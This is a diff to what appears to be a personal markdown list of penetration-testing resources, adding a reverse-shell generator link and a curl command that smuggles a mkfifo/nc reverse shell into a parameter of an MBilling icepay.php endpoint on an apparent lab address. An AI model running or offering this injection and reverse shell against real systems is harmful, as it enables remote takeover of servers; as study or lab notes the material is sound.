@@ -25,6 +25,9 @@ List of tools/resources for Cybersecurity
 - LinPeas https://github.com/peass-ng/PEASS-ng
 - DirtyCow https://github.com/firefart/dirtycow // https://github.com/firefart/dirtycow/blob/master/dirty.c
 - linux-exploit-suggester
+- https://www.revshells.com/
+- Encode payload in URL
+-     ```curl -s 'http://10.10.7.56/mbilling/lib/icepay/icepay.php' --get --data-urlencode 'democ=;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.9.0.186 4443 >/tmp/f;'```
   
 ### Windows
 - BeRoot.exe
